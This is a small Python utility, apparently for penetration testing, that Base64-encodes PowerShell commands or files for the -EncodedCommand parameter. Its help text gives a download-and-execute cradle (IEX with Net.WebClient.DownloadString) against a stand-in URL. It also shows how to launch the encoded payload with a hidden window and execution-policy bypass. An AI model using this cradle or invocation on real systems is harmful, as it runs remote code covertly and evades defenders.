# Encode PowerShell to be used via -enc / -EncodedCommand (UTF-16LE -> Base64)

import argparse
import base64
import textwrap

def encode_command(cmd):
    return base64.b64encode(cmd.encode("utf-16-le")).decode() 

def encode_file(file):
    with open(file) as f:
        contents = f.read()
        return base64.b64encode(contents.encode("utf-16-le")).decode()

def parse_args():
    parser = argparse.ArgumentParser(
        description="""Encode PowerShell to Base64 (UTF-16LE) compatible with PowerShell's -EncodedCommand (-enc) parameter.""",
        epilog=textwrap.dedent("""
            Examples:
              python3 ps_encode.py -c 'IEX (New-Object Net.WebClient).DownloadString("http://example.com/payload")'
              python3 ps_encode.py -f script.ps1
            
            How to use the encoded payload:
              powershell.exe -EncodedCommand [encoded_payload]
              powershell.exe -WindowStyle Hidden -NonInteractive -exec bypass -enc [encoded_payload]
        """),
        formatter_class=argparse.RawTextHelpFormatter
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-c", "--cmd", type=str, help="Encode PowerShell command (inline)")
    group.add_argument("-f", "--file", type=str, help="Encode file contents")

    args = parser.parse_args()

    return args

if __name__ == "__main__":
    args = parse_args()

    try:
        if args.cmd:
            encoded = encode_command(args.cmd)
        else: # Must be args.file
            encoded = encode_file(args.file)
    
        print("[+] Encoded payload:\n")
        print(encoded)

    except FileNotFoundError as e:
        print(f"[-] File not found: {e.filename}")
    
    except Exception as e:
        print(f"[-] Error: {e}")
